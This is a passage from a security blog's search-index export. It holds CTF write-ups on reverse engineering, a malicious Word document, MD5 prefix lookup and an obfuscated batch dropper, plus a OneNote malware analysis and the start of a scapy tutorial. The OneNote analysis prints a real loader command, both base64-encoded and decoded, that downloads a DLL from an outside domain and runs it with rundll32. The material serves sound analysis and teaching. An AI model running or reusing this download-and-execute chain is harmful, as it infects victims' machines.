it checks our input with the correct decrypted passphrase:\nStepping over the breakpoint, we will see that the variable “value” now holds the decrypted passphrase:\nWe can actually modify the “text” = “test” value to the real password in order to bypass the check and get the flag:\nStepping over once again, we pass the if statement and get the decrypted flag:\nFlag: \u0026ldquo;FLAG{y0u_unl0ck3d_7h3_f029073n_53c2375}\u0026rdquo;\nWe could also just rerun the program and provide the correct passphrase.\n","permalink":"http://localhost:1313/ctfwriteups/ancientcavevault/","summary":"\u003cp\u003eThis is a ‘secret password’ type of challenge, where we need to somehow reverse engineer the given executable and find the correct password:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/pmdk/ancientcavevault/acv1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eAfter the final wrong attempt, the executable closes:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/pmdk/ancientcavevault/acv2.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSo how can we find the correct password for the executable? Well, we first need to review its code. If you run the ‘file’ command on the given file, you will find out that this is a Mono/.Net assembly, and if you search up with how to decompile (reverse) these type of programs/applications, a tool named DnSpy will come up which is a tool used for exactly that – decompile/debug .net executables.\u003c/p\u003e","title":"Ancient Cave Vault - Writeup"},{"content":"Upon decompressing the provided file, we were presented with a Word document. Opening it, we are presented with the following:\nAvoiding to click on “Enable Content”, we navigate to the panel where the macro code exists and see the following seemingly obfuscated VBA code:\nOne way we can deobfuscate this is utilizing the ChatGPT AI service:\nJust by asking ChatGPT to deobfuscate the code, we are provided with a much more clear version of the found macros.\nUnfortunately, this will end up being a dead end and will give us no leads whatsoever about finding the flag. In cases like this, we should turn to tools such as “olevba”, which is a tool that automates the analysis of seemingly malicious docs and provides the artifacts found. The tool is simply run by executing the following command:\nolevba [document_name] and can be found at:\nhttps://github.com/decalage2/oletools/wiki/olevba Running it, we get the following output:\nThis is the code we previously found manually. At the end of the output though, we get the following summary table:\nThe most interesting line here is the last one which refers to something called VBA stomping. Also, we get some extra output regarding the VBA stomping:\nBut this will not lead to anywhere, since the olevba tool itself refers to VBA detection being in an experimental stage. Searching further on what VBA stomping is, we get the following references:\nSo the results makes a reference on something called p-code. Continuing our search on how to analyze p-code of a document, we find references to the following tools:\nhttps://github.com/Big5-sec/pcode2code https://github.com/bontchev/pcodedmp We can download and use the first tool like:\nwhich dumped the p-code into res.txt file. Let’s open and see what is inside this file:\nEverytime we have to do with obfuscated code, we start with what we can reverse. We see a bunch of chr() and XOR operations which are reversable. So we will start by recovering the strings that these operators generate. We will create a python script that will compute these chr() operations and print us the result:\nWe made some modifications to match python syntax, such as:\nremoving the space character replacing the “\u0026amp;” with “+” in order to concatenate strings replacing “Xor” with “^” to make XOR operations replacing capital ‘C’ to lowercase ‘c’ since pythons chr() function uses a lowercase ‘c’. Then, we used eval() to run the commands stored in the string. The result we end up with is “System.Security.Cryptography.ToBase64Transform”. Doing this operation for the rest of the code, we end up with:\nWe also spot some mathematical operations, which again are easily reversable:\nFrom the resulted code, we spot that the function vwvwdew() is first executed, which calls a function called yocce(), giving it a string parameter. This function initializes some variables and objects. One of the objects it initializes is:\nSo onixhh object is basically a System.Security.Cryptography.RijndaelManaged object. Googling what that is we find that it is an AES predecessor algorithm:\nSo we can rename this object to AES instead. We then see that a call is being made to ltrcd function with the string we originally passed as argument to yocce() function. Let’s see what this function does:\nSo this function takes the string that was passed as argument and base64 decodes it. Then it gets the resulted bytes and returns them in the yocce() function. Then, yocce() function takes the resulted base64 decoded string and encrypts it:\nIt then calls frjwlq() function with the resulted encrypted string as argument:\nwhere it is base64 encoded again and returned. So we can safely assume that the original base64 encoded string that was passed as argument originally was a base64 encoded string. Since this VBA script is trivial, there is no much more to it. Trying to decode the original base64 string that was passed early on in the code, we get the flag:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#34;Q1RGTElCe2M0MjNmdWxsXzBmXzdoM19wLWMwZDMhIX0=\u0026#34;) b\u0026#39;CTFLIB{c423full_0f_7h3_p-c0d3!!}\u0026#39; \u0026gt;\u0026gt;\u0026gt; ","permalink":"http://localhost:1313/ctfwriteups/anothermaliciousdoc/","summary":"\u003cp\u003eUpon decompressing the provided file, we were presented with a Word document. Opening it, we are presented with the following:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/anothermaldoc/amd1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eAvoiding to click on “Enable Content”, we navigate to the panel where the macro code exists and see the following seemingly obfuscated VBA code:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/anothermaldoc/amd2.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eOne way we can deobfuscate this is utilizing the ChatGPT AI service:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/anothermaldoc/amd3.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eJust by asking ChatGPT to deobfuscate the code, we are provided with a much more clear version of the found macros.\u003cbr\u003e\nUnfortunately, this will end up being a dead end and will give us no leads whatsoever about finding the flag.\nIn cases like this, we should turn to tools such as “olevba”, which is a tool that automates the analysis of seemingly malicious docs and provides the artifacts found. The tool is simply run by executing the following command:\u003c/p\u003e","title":"Another malicious doc - Writeup"},{"content":"For this challenge you would normally fire up a docker instance that unfortunately you can\u0026rsquo;t have access at the time, but the py script that runs on the server is provided to you in case you need to run it locally. Now, onto the chall!\nThe concept of this challenge is about rainbow table attacks. The user is given the 5 first characters of an md5 hash of a random hex string. The goal is to compute all possible md5 hashes and construct a dictionary with key being the 5-characters start of the hash and value being the original string. Basically, this challenge’s code is its solution.\nExploitation Connecting with netcat to the challenge,we get the following:\n┌──(aastro㉿kali)-[~/ecsc/ctflib/challenge]\r└─$ nc protons.ddns.net 50769\rEnter a string in hex whose md5 hash starts with: \u0026#34;00713\u0026#34; Since it asks for a string whose hash begins with ‘xxxxx’.length == 5 and since it says the string is in hex, we come to the conclusion that all possible combinations are finite, meaning we can compute all possible combinations and match the correct one. All possible combinations are 16^5 = 1.048.576 .This is because we want to compute all possible combinations to get the correct first 5 characters of the hash, and since we are talking about hex, every character can be from 0 – F.\nNow to the solution.\nWe know how many combinations we need to calculate. So we need to make a loop which computes a new md5 hash combination of a random hex string each time. These hex strings are unique each time. In every loop, we store the first 5 characters as a key to a dictionary and the corresponding value to that key will be the original string from which these 5 characters came from. We need to make it this way so when the challenge asks for the beginning of a hashed string, we will simply pass to our script the start of the hash that is given, and we will get back the corresponding string.\nLet’s see the script:\nimport hashlib import secrets rainbowTable = {} while len(rainbowTable.keys())\u0026lt; 0xffff0: s = secrets.token_hex(16) m = hashlib.md5() m.update(s.encode(\u0026#39;ascii\u0026#39;)) h = m.hexdigest()[:5] rainbowTable[h] = s inp = input(\u0026#34;Enter start of hash: \u0026#34;) for k in rainbowTable.keys(): if inp == k: print(\u0026#34;Corresponding string is: \u0026#34;,rainbowTable[k]) break Lines 1,2 : We import the necessary libraries. Line 4 : We create our dictionary. Line 5 : We start the loop. We want the loop to run until the length of the dictionary reaches the value of fffff (which is the value we calculated before) so we get all the possible combinations. Line 6 : From the documentation This way we start calculating the hex values.\nLine 7,8 : We initialize a variable that will be used for hashing, and we pass it the hex value we just calculated. Line 9 : We then take the first 5 characters of the hashed string and pass them to a variable that will be used as a key. Line 10 : We create a key-value pair in our dictionary with key being the previous 5 characters from the hashed value and value being the original string before being hashed. Lines 12,13,14,15 : These are used to find the corresponding value of the key given. So lets run the challenge and our script :\nIn the left, we have the challenge running, and in the right we have our script. Passing the start of the hashed string to our script, we get the corresponding string to this hashed start. So, we turn back to the challenge and pass the string that we got from our script, which is the correct one so we get the flag: CTFLIB{4nTI-hUM4NS_C4PTCHA__}\n","permalink":"http://localhost:1313/ctfwriteups/captcha4humans/","summary":"\u003cp\u003eFor this challenge you would normally fire up a docker instance that unfortunately you can\u0026rsquo;t have access at the time, but the py script that runs on the server is provided to you in case you need to run it locally. Now, onto the chall!\u003c/p\u003e\n\u003cp\u003eThe concept of this challenge is about rainbow table attacks. The user is given the 5 first characters of an md5 hash of a random hex string. The goal is to compute all possible md5 hashes and construct a dictionary with key being the 5-characters start of the hash and value being the original string. Basically, this challenge’s code is its solution.\u003c/p\u003e","title":"captcha 4 humans - Writeup"},{"content":"Upon opening the file, we are presented with a memory dump and a batch script. Initially, the batch script appears to have been obfuscated:\nMoreover, the memory dump alone does not yield any useful insights.\nTherefore, the initial approach is to utilize search engines, such as Google, to gain an understanding of the nature and potential purpose of the batch script:\nUpon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.\nOf particular interest is the first post, which features a script that bears a striking resemblance to our own:\nThis post states the following:\nFor further reading, this post can be found at:\nhttps://superuser.com/questions/1676713/how-to-decode-contents-of-a-batch-file-with-chinese-characters So let’s try to follow these steps and open the batch script in the hex editor HxD: And it worked. We now have a less obfuscated script of which we can make notice of some readable characters.\nLet’s copy the whole hex block to cyberchef and convert it to ascii:\nTo continue on with the next level of deobfuscation, let’s copy the code to notepad (or any other text editor) in order to make some modifications if needed:\nWe can spot some readable words such as cls, public and envPolisus.\nThe remaining text appears to be concealed using a second stage of obfuscation, marked by the \u0026quot; %:~\u0026quot; symbols.\nWe can refer to the earlier post we analyzed, which provides an example on how to deobfuscate code employing this technique.\nNotably, these symbols are frequently utilized in VBA syntax and CMD variables. In CMD or VBA, variables are created using the \u0026ldquo;set\u0026rdquo; command, and their contents can be retrieved by enclosing the variable name within percentage symbols (\u0026quot;%\u0026quot;):\nC:\\Users\\connar\u0026gt;set example=\u0026#34;This is an example\u0026#34;\rC:\\Users\\connar\u0026gt;%example%\r\u0026#39;\u0026#34;This is an example\u0026#34;\u0026#39; is not recognized as an internal or external command,\roperable program or batch file. Additionally, the unusual \u0026ldquo;:~number, number\u0026rdquo; patterns that we observed earlier in the script serve to extract specific portions of a value that has been stored in a variable. For instance:\nC:\\Users\\connar\u0026gt;%example:~12,2%\r\u0026#39;ex\u0026#39; is not recognized as an internal or external command,\roperable program or batch file.\rC:\\Users\\connar\u0026gt;%example:~12,1%\r\u0026#39;e\u0026#39; is not recognized as an internal or external command,\roperable program or batch file. To illustrate, consider the following examples:\n%example:~12%: This command counts 12 positions from the beginning of the \u0026ldquo;example\u0026rdquo; string, and then returns the remaining characters of the string, which is \u0026ldquo;example\u0026rdquo;. %example:~12,2%: This command counts 12 positions from the start of the \u0026ldquo;example\u0026rdquo; string, returns the remaining characters of the string (\u0026ldquo;example\u0026rdquo;), and then extracts the first two characters, which are \u0026ldquo;ex\u0026rdquo;. %example:~12,1%: This command counts 12 positions from the beginning of the \u0026ldquo;example\u0026rdquo; string, returns the remaining characters of the string (\u0026ldquo;example\u0026rdquo;), and then retrieves the first character, which is \u0026ldquo;e\u0026rdquo;. It appears that this technique is a form of obfuscation known as environment variable obfuscation, which constructs commands using letters stored in Windows environment variables. By utilizing this method, the obfuscated code can avoid detection, as it does not rely on known malicious commands in plain text. Instead, the commands are assembled during runtime. To deobfuscate the code, we can proceed line by line through the script and enter each line into the terminal using the \u0026ldquo;echo\u0026rdquo; command to observe its behavior:\nIt\u0026rsquo;s worth noting that the terminal treats uppercase and lowercase variables as equivalent. For example, \u0026ldquo;R\u0026rdquo; is the same as \u0026ldquo;r\u0026rdquo;. Additionally, the \u0026ldquo;^\u0026rdquo; symbol needs to be escaped in the command.\nWe can see that the script checks if an environment variable called envPolisus is empty. If it is, it prints:\nC:\\Users\\connar\u0026gt;echo ec%r:~11,1%o Co%r:~13,1%ld no%r:~4,1% %r:~13,1%pda%r:~4,1%e yo%r:~13,1%r %r:~9,1%%r:~2,1%ndo%r:~9,1%%r:~8,1%\recho Could not update your windows In the case where the environment variable exists, the script continues execution.\nIf we wanted to run this script in an isolated environment, we could set this variable to something and this script would continue executing, so we could analyze it dynamically (for example with Wireshark to see if it tries to connect to somewhere).\nContinuing on:\nIt tries to run a Powershell command which essentially gets the value of envPolisus variable, and then gets its SHA256 hash and stores it in a file.\nIt then reads from this file and checks if the hash it read is equal to:\nIf it is, it continues executing. If its not, it prints a message and stops.\nThe \u0026ldquo;envPolisus\u0026rdquo; variable as we can see gets used a lot, and while we have its SHA256 hash, attempting to crack it with hashcat would likely be a dead end. However, we do have access to the memory dump that was provided to us.\nAlthough we may not have the \u0026ldquo;envPolisus\u0026rdquo; variable set on our own system, the system from which the memory dump was taken might. By using a tool like Volatility, we can attempt to locate this variable in the memory dump:\nAnd we get the first part of the flag!\nThe sha256 sum of this string is really the hash displayed on the script:\n\u0026gt;\u0026gt;\u0026gt; from hashlib import sha256 \u0026gt;\u0026gt;\u0026gt; part1 = b\u0026#34;CTFLIB{50m4l1_p12473_\u0026#34; \u0026gt;\u0026gt;\u0026gt; sha256(part1).hexdigest() \u0026#39;f590ad9a61d196447f3832ab3b3ba449e45b381aaf0bfa6de07d08f2d4de5a9a\u0026#39; \u0026gt;\u0026gt;\u0026gt; Continuing on with the analysis, we have:\nBasically, it uses this “lru” variable, which is automatically deobfuscated from our echo command, to download whatever is in this url and stores it in a file called windowsUpdater.ps1:\nOnce the contents of the Pastebin post have been downloaded and stored in the \u0026ldquo;windowsUpdater.ps1\u0026rdquo; file, the script attempts to locate and execute this file, assuming that the download was successful:\nThe script uses a loop to search for a corresponding file, and if it finds one, it saves the file name to a variable called \u0026ldquo;p\u0026rdquo; and executes it with Powershell. If everything has gone successfully, this is the end of the script. However, we still have not found the second part of the flag. Perhaps we can find it by visiting the Pastebin post mentioned in the script:\nVisiting the Pastebin post, we can see more Powershell code which thankfully is not so obfuscated this time.\nWhat catches our eyes is a weirdly big string that looks like base64 encoded. Copying it and decoding it in Cyberchef, we get:\nIt tries to download even more files. The file it tries to download again looks like its base64 encoded. Trying to decode it we get the second part of the flag:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#34;MDZmdTVjNDcxMG5fMTVfcHIzNzd5X24zNDd9\u0026#34;) b\u0026#39;06fu5c4710n_15_pr377y_n347}\u0026#39; ","permalink":"http://localhost:1313/ctfwriteups/chinesewindowsupgrader/","summary":"\u003cp\u003eUpon opening the file, we are presented with a memory dump and a batch script. Initially, the batch script appears to have been obfuscated:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/chinesewindowsupdater/cwu1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eMoreover, the memory dump alone does not yield any useful insights.\u003cbr\u003e\nTherefore, the initial approach is to utilize search engines, such as Google, to gain an understanding of the nature and potential purpose of the batch script:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/chinesewindowsupdater/cwu2.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eUpon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.\u003cbr\u003e\nOf particular interest is the first post, which features a script that bears a striking resemblance to our own:\u003c/p\u003e","title":"Chinese Windows Updater - Writeup"},{"content":"Intro In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:\nOneNoteAnalyzer.exe pyonenote.py The sample I practised on is the following:\nhttps://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/ Viewing the sample Opening the sample in an online .one viewer, we can observe the following:\nWe can see that a .cmd script is placed at the \u0026lsquo;Open\u0026rsquo; button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let\u0026rsquo;s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document.\nOneNoteAnalyzer The use of this tool is simple. We only need to run the command OneNoteAnalyzer.exe --file [file] and get the output and extracted files:\nLet\u0026rsquo;s also use the pyonenote.py tool before proceeding to analyze the extracted files.\npyonenote We can get the pyonenote tool from the following repo:\nhttps://github.com/DissectMalware/pyOneNote Running the script finds the same information as the previous tool, just in a more verbose way:\nExtracted files - Open.cmd The file that is of most interest to us is the open.cmd file. Opening the file and viewing its contents, we see the following command:\npowershell.exe [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0026#39;DQpAZWNobyBvZmYNCg0KcG93ZXJzaGVsbCBJbnZva2UtV2ViUmVxdWVzdCAtVVJJIGh0dHBzOi8vYXJhZGNhcGl0YWwuY29tL01wRDhZay8wMC5naWYgLU91dEZpbGUgQzpccHJvZ3JhbWRhdGFcYmlnLmpwZw0KY2FsbCBydSUxbDMyIEM6XHByb2dyYW1kYXRhXGJpZy5qcGcsRGxsUmVnaXN0ZXJTZXJ2ZXINCg0KZXhpdA0K\u0026#39;)) \u0026gt; C:\\ProgramData\\in.cmd\u0026amp;\u0026amp;start /min C:\\ProgramData\\in.cmd ndl Decoding the base64 code, we end with the following command:\n@echo off powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\\programdata\\big.jpg call ru%1l32 C:\\programdata\\big.jpg,DllRegisterServer exit So basically this cmd file decodes an encoded base64 string, saves it in another cmd file named in.cmd and then runs it with the ndl parameter which specifies that directory names are not to be logged.\nThis decoded base64 string as we saw by decoding it is another powershell command that downloads file named 00.gif and outputs it in another file named big.jpg. Then it proceeds to run it by using rundll32 in an obfuscated way. So we can safely assume this file is a .dll file.\nAll that\u0026rsquo;s left to do is analyze the DLL which can be found at:\nhttps://bazaar.abuse.ch/sample/5fb7f3fac0a9b9ab243ee642a0775500c524166ef075035c9510ccbab76ad633/ Extracted files - big.jpg Downloading the file and running the file command on it, we get the following info:\n┌──(connar㉿kali)-[~/blog/oneNote_samples] └─$ file big.jpg big.jpg: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows Initially opening the dll in Ghidra, it seems to be packed. For this purpose I uploaded it to any.run to observe its activity, and got the following feedback:\nSearching various strings, hashes and even bytes, I found out that there was a debate of whether this malware was of the family Matanbuchus but it ended up being related to PikaBot and was named Beep-Malware. I will try and analyze this dll in another post and share what I learned along the way:)\nThat is it for this post!\nReferences\n[1] Guided Hacking: Malicious OneNote Documents - Malware Analysis\r[2] pan-unit42: 2023-02-07-IOCs-for-probable-Matanbuchus-activity.txt\r","permalink":"http://localhost:1313/posts/onenote/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eIn this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOneNoteAnalyzer.exe\u003c/li\u003e\n\u003cli\u003epyonenote.py\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe sample I practised on is the following:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/\"\u003ehttps://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"viewing-the-sample\"\u003eViewing the sample\u003c/h2\u003e\n\u003cp\u003eOpening the sample in an online .one viewer, we can observe the following:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/onenote/onenote1.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eWe can see that a .cmd script is placed at the \u0026lsquo;Open\u0026rsquo; button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let\u0026rsquo;s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document.\u003c/p\u003e","title":"Exploring OneNote Forensic tools"},{"content":"Intro In this post we will explore the scapy library in python and its features when it comes to analyzing pcap files. In general, scapy library can be used for both red team (sniffing traffic) and blue team operations (analyzing pcap files). We will stick to the second one for this post.\nI learned about scapy back when I started playing CTF challenges and was trying to solve a challenge where data had been exfiltrated through the ICMP protocol (we will see that challenge later). The idea in that challenge was that data was exfiltrated from the victim machine through ping requests - byte by byte. As you can tell, it was really difficult to manually reconstruct the exfiltrated data as this would mean copying and pasting the corresponding data from each packet. This is not really practical if you have a big pcap file.\nThen, I came across a video of 0xdf (I have learned so many stuff from him) where he used the scapy library for the same challenge to reconstruct the exfilled packet easy and simple (and quickly too!). I was really amazed by scapy\u0026rsquo;s functionality and soon after it became my go-to tool for analyzing pcap files and specifically for C2 traffic.\nThrough this post we will see a general approach of how to translate what you see in Wireshark (i.e. the fields of a packet) to scapy\u0026rsquo;s syntax. For example, we can see in Wireshark\u0026rsquo;s GUI an IP address of some packet, but how can we get it through a python script using scapy?\nAfter we briefly explain the logic and methodology on how to find the fields you are interested in, we will see some practical examples such as some CTF challenges where scapy comes useful - including the exfil chall I mentioned in the start.\nHTTP traffic analysis To begin with, we will start analyzing a PoC pcap taken from wireshark.org which is just a simple http traffic pcap file. You can find the pcap file here.\nLet\u0026rsquo;s open it in Wireshark first to get a view of what we are dealing with and what to expect:\nWe see that the total number of packets is 43. Let\u0026rsquo;s see how to find that with scapy!\nGetting the number of packets In order to get the number of packets, we first of all need to read the pcap file:\nfrom scapy.all import * # Use rdpcap to read the pcap data pcap = rdpcap(\u0026#34;./http.cap\u0026#34;) Then, we could either print the lenght of the pcap variable (which is a list) in python, but I will show a trick that will be useful in finding any field of interest. The trick is to run the script in interactive mode in order to have access to the variables. It will become really handy in finding what properties each variable (i.e. each packet) has:\n└─$ python -i parser.py \u0026gt;\u0026gt;\u0026gt; pcap \u0026lt;http.cap: TCP:41 UDP:2 ICMP:0 Other:0\u0026gt; \u0026gt;\u0026gt;\u0026gt; len(pcap) 43 \u0026gt;\u0026gt;\u0026gt; We indeed observe that our script finds the same number of packets as the wireshark shows. We always need to validate that our packets match to avoid parsing errors in future case scenarios.\nGetting the checksum value of a packet Let\u0026rsquo;s try comparing a field of the first packet of Wireshark with the first packet that our script parses. For this purpose, we will try getting the checksum value:\nThe question is, how do we find the correct syntax to get this field? Here is where the interactive mode comes handy:\n└─$ python -i parser.py \u0026gt;\u0026gt;\u0026gt; first_packet = pcap[0] \u0026gt;\u0026gt;\u0026gt; first_packet \u0026lt;Ether dst=fe:ff:20:00:01:00 src=00:00:01:00:00:00 type=IPv4 |\u0026lt;IP version=4 ihl=5 tos=0x0 len=48 id=3905 flags=DF frag=0 ttl=128 proto=tcp chksum=0x91eb src=145.254.160.237 dst=65.208.228.223 |\u0026lt;TCP sport=3372 dport=http seq=951057939 ack=0 dataofs=7 reserved=0 flags=S window=8760 chksum=0xc30c urgptr=0 options=[(\u0026#39;MSS\u0026#39;, 1460), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;SAckOK\u0026#39;, b\u0026#39;\u0026#39;)] |\u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; dir(first_packet) [\u0026#39;_PickleType\u0026#39;, \u0026#39;__all_slots__\u0026#39;, \u0026#39;__bool__\u0026#39;, \u0026#39;__bytes__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__class_getitem__\u0026#39;, \u0026#39;__contains__\u0026#39;, \u0026#39;__deepcopy__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__delitem__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__div__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattr__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__getitem__\u0026#39;, \u0026#39;__getstate__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__iter__\u0026#39;, \u0026#39;__iterlen__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__len__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__mul__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__nonzero__\u0026#39;, \u0026#39;__orig_bases__\u0026#39;, \u0026#39;__parameters__\u0026#39;, \u0026#39;__rdiv__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__rmul__\u0026#39;, \u0026#39;__rtruediv__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__setitem__\u0026#39;, \u0026#39;__setstate__\u0026#39;, \u0026#39;__signature__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__slots__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__truediv__\u0026#39;, \u0026#39;__weakref__\u0026#39;, \u0026#39;_answered\u0026#39;, \u0026#39;_command\u0026#39;, \u0026#39;_defrag_pos\u0026#39;, \u0026#39;_do_summary\u0026#39;, \u0026#39;_is_protocol\u0026#39;, \u0026#39;_name\u0026#39;, \u0026#39;_overload_fields\u0026#39;, \u0026#39;_pkt\u0026#39;, \u0026#39;_raw_packet_cache_field_value\u0026#39;, \u0026#39;_resolve_alias\u0026#39;, \u0026#39;_show_or_dump\u0026#39;, \u0026#39;_superdir\u0026#39;, \u0026#39;add_parent\u0026#39;, \u0026#39;add_payload\u0026#39;, \u0026#39;add_underlayer\u0026#39;, \u0026#39;aliastypes\u0026#39;, \u0026#39;answers\u0026#39;, \u0026#39;build\u0026#39;, \u0026#39;build_done\u0026#39;, \u0026#39;build_padding\u0026#39;, \u0026#39;build_ps\u0026#39;, \u0026#39;canvas_dump\u0026#39;, \u0026#39;class_default_fields\u0026#39;, \u0026#39;class_default_fields_ref\u0026#39;, \u0026#39;class_dont_cache\u0026#39;, \u0026#39;class_fieldtype\u0026#39;, \u0026#39;class_packetfields\u0026#39;, \u0026#39;clear_cache\u0026#39;, \u0026#39;clone_with\u0026#39;, \u0026#39;command\u0026#39;, \u0026#39;comment\u0026#39;, \u0026#39;copy\u0026#39;, \u0026#39;copy_field_value\u0026#39;, \u0026#39;copy_fields_dict\u0026#39;, \u0026#39;decode_payload_as\u0026#39;, \u0026#39;default_fields\u0026#39;, \u0026#39;default_payload_class\u0026#39;, \u0026#39;delfieldval\u0026#39;, \u0026#39;deprecated_fields\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;dispatch_hook\u0026#39;, \u0026#39;display\u0026#39;, \u0026#39;dissect\u0026#39;, \u0026#39;dissection_done\u0026#39;, \u0026#39;do_build\u0026#39;, \u0026#39;do_build_payload\u0026#39;, \u0026#39;do_build_ps\u0026#39;, \u0026#39;do_dissect\u0026#39;, \u0026#39;do_dissect_payload\u0026#39;, \u0026#39;do_init_cached_fields\u0026#39;, \u0026#39;do_init_fields\u0026#39;, \u0026#39;dst\u0026#39;, \u0026#39;explicit\u0026#39;, \u0026#39;extract_padding\u0026#39;, \u0026#39;fields\u0026#39;, \u0026#39;fields_desc\u0026#39;, \u0026#39;fieldtype\u0026#39;, \u0026#39;firstlayer\u0026#39;, \u0026#39;fragment\u0026#39;, \u0026#39;from_hexcap\u0026#39;, \u0026#39;get_field\u0026#39;, \u0026#39;getfield_and_val\u0026#39;, \u0026#39;getfieldval\u0026#39;, \u0026#39;getlayer\u0026#39;, \u0026#39;guess_payload_class\u0026#39;, \u0026#39;hashret\u0026#39;, \u0026#39;haslayer\u0026#39;, \u0026#39;hide_defaults\u0026#39;, \u0026#39;init_fields\u0026#39;, \u0026#39;iterpayloads\u0026#39;, \u0026#39;json\u0026#39;, \u0026#39;lastlayer\u0026#39;, \u0026#39;layers\u0026#39;, \u0026#39;lower_bonds\u0026#39;, \u0026#39;match_subclass\u0026#39;, \u0026#39;mysummary\u0026#39;, \u0026#39;name\u0026#39;, \u0026#39;original\u0026#39;, \u0026#39;overload_fields\u0026#39;, \u0026#39;overloaded_fields\u0026#39;, \u0026#39;packetfields\u0026#39;, \u0026#39;parent\u0026#39;, \u0026#39;payload\u0026#39;, \u0026#39;payload_guess\u0026#39;, \u0026#39;pdfdump\u0026#39;, \u0026#39;post_build\u0026#39;, \u0026#39;post_dissect\u0026#39;, \u0026#39;post_dissection\u0026#39;, \u0026#39;post_transforms\u0026#39;, \u0026#39;pre_dissect\u0026#39;, \u0026#39;prepare_cached_fields\u0026#39;, \u0026#39;psdump\u0026#39;, \u0026#39;raw_packet_cache\u0026#39;, \u0026#39;raw_packet_cache_fields\u0026#39;, \u0026#39;remove_parent\u0026#39;, \u0026#39;remove_payload\u0026#39;, \u0026#39;remove_underlayer\u0026#39;, \u0026#39;route\u0026#39;, \u0026#39;self_build\u0026#39;, \u0026#39;sent_time\u0026#39;, \u0026#39;setfieldval\u0026#39;, \u0026#39;show\u0026#39;, \u0026#39;show2\u0026#39;, \u0026#39;show_indent\u0026#39;, \u0026#39;show_summary\u0026#39;, \u0026#39;sniffed_on\u0026#39;, \u0026#39;sprintf\u0026#39;, \u0026#39;src\u0026#39;, \u0026#39;stop_dissection_after\u0026#39;, \u0026#39;summary\u0026#39;, 